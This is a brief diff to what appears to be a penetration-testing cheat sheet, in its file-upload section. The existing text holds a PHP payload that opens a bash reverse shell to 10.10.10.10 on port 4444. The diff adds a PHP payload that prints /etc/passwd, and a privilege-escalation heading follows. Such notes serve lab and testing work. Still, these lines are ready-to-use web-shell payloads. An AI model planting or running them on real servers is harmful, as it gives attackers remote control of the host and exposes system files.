@@ -117,6 +117,10 @@ File upload:
 <?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>
 ```
 
+```php
+<?php echo file_get_contents('/etc/passwd'); ?>
+```
+
 ### Privilege Escalation
 
 Check `sudo` permissions:
